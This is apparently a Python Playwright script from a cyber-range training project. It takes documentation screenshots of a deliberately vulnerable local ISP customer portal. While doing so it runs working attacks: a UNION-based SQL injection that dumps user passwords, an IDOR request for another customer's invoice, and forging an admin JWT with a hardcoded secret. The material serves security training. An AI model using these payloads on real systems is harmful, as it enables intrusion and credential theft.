"""Capture NetLink customer-portal screenshots for Scenario 03."""

import os
import json
import subprocess
import tempfile
from urllib.parse import quote
from playwright.sync_api import sync_playwright

OUT = "/home/mike/cyberfort/cyber-range-scenarios/03-netlink-isp-digital-infra/docs/screenshots/app"
HOST = "http://localhost:3000"


def shot(page, name, full=False):
    page.screenshot(path=f"{OUT}/{name}.png", full_page=full)
    print(f"  📸 {name}.png")


def render_text_as_screenshot(text, out_path, title="Terminal", width=1100, height=520):
    """Render plain text as a terminal-styled image via headless Chrome."""
    html = f"""<!doctype html><html><head><meta charset="utf-8"><style>
html,body{{margin:0;overflow:hidden;background:#1a1d22}}
.term{{background:#1a1d22;color:#e4e4e7;font-family:"SF Mono",Menlo,Consolas,monospace;
       padding:14px 18px 18px;font-size:12.5px;line-height:1.5;white-space:pre-wrap;
       word-break:break-all}}
.title{{background:#283747;color:#f6c453;padding:6px 14px;font-family:-apple-system,sans-serif;font-size:11.5px;letter-spacing:0.4px}}
.prompt{{color:#7dd3fc}}
.kw{{color:#fde68a}}
</style></head><body><div class="title">{title}</div><div class="term">{text}</div></body></html>"""
    with tempfile.NamedTemporaryFile(suffix=".html", mode="w", delete=False) as fh:
        fh.write(html)
        path = fh.name
    subprocess.run(["google-chrome", "--headless=new", "--no-sandbox", "--disable-gpu",
                    f"--window-size={width},{height}", f"--screenshot={out_path}",
                    f"file://{path}"], check=True, capture_output=True)
    os.unlink(path)
    print(f"  📸 {os.path.basename(out_path)}")


def main():
    os.makedirs(OUT, exist_ok=True)
    with sync_playwright() as p:
        b = p.chromium.launch(headless=True)
        ctx = b.new_context(viewport={"width": 1100, "height": 700}, ignore_https_errors=True)
        page = ctx.new_page()

        # 1. Login page
        print("[1] login page")
        page.goto(f"{HOST}/login", wait_until="domcontentloaded")
        page.wait_for_timeout(500)
        shot(page, "netlink-01-login-page")

        # 2. Log in as Bob (customer)
        print("[2] login as bob")
        page.fill('input[name="username"]', "bob")
        page.fill('input[name="password"]', "bobcustomer")
        page.click('button[type="submit"]')
        page.wait_for_load_state("networkidle", timeout=10000)
        page.wait_for_timeout(800)
        shot(page, "netlink-02-customer-dashboard")

        # 3. SQL injection — JSON response with leaked user passwords
        print("[3] SQLi")
        injection = "%' UNION SELECT id, username, password, role FROM users -- "
        page.goto(f"{HOST}/api/customers/search?q={quote(injection)}",
                  wait_until="domcontentloaded", timeout=10000)
        page.wait_for_timeout(500)
        shot(page, "netlink-03-sqli-json")

        # 4. IDOR — invoice #5 (Carol Corp confidential)
        print("[4] IDOR")
        page.goto(f"{HOST}/api/invoices/5", wait_until="domcontentloaded", timeout=10000)
        page.wait_for_timeout(500)
        shot(page, "netlink-04-idor-invoice")

        # 5. Forge an admin JWT and capture the diagnostics endpoint result
        # — best shown as a terminal screenshot (command + output).
        print("[5] JWT forgery → diagnostics")
        token = subprocess.check_output([
            "docker", "exec", "netlink_api", "node", "-e",
            "console.log(require('jsonwebtoken').sign("
            "{id:999,username:'attacker',role:'admin'},"
            "'netlink-jwt-2024',{expiresIn:'8h'}))"
        ]).decode().strip()
        diag = subprocess.check_output([
            "curl", "-s", "-H", f"Cookie: token={token}",
            "http://localhost:3000/api/admin/diagnostics",
        ]).decode()
        try:
            diag_pretty = json.dumps(json.loads(diag), indent=2)
        except Exception:
            diag_pretty = diag

        terminal_text = (
            '<span class="prompt">$</span> <span class="kw"># forge an admin JWT using the hardcoded secret in src/config.js</span>\n'
            '<span class="prompt">$</span> TOKEN=$(node -e "console.log(require(\'jsonwebtoken\').sign(\\\n'
            '      {id:999,username:\'attacker\',role:\'admin\'},\\\n'
            '      \'netlink-jwt-2024\', {expiresIn:\'8h\'}))")\n'
            '<span class="prompt">$</span> echo "$TOKEN"\n'
            f'{token}\n\n'
            '<span class="prompt">$</span> <span class="kw"># hit the admin diagnostics endpoint with the forged token</span>\n'
            '<span class="prompt">$</span> curl -s -H "Cookie: token=$TOKEN" \\\n'
            '      http://&lt;VM2&gt;:3000/api/admin/diagnostics\n'
            f'{diag_pretty}\n'
        )
        render_text_as_screenshot(
            terminal_text,
            f"{OUT}/netlink-05-jwt-forgery-terminal.png",
            title="trainee@vm2:~$  JWT forgery + admin diagnostics",
            width=1100, height=620,
        )

        b.close()
        print("\n✅ NetLink screenshots done")


if __name__ == "__main__":
    main()
